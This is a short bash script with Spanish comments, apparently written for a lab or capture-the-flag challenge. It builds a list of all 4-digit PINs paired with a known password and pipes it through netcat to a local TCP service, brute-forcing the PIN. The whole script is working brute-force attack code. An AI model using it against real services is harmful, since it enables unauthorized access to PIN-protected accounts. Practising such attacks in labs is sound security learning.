#!/bin/bash

#Genera un diccionario de pines de 4 digitos para un servidor que solicita autenticacion con password and pin por TCP  


password=$1
port=$2
for i in {0000..9999}; do
            echo "$password $i" >> data.txt  #Crear el archivo con el diccionaro de pines
done

cat data.txt | nc localhost $port # Solicita la conexion por TCP given a Port


# execute ./pin_forcebrute.sh [password] [port] | grep -v -E "filtro1|filtro2"
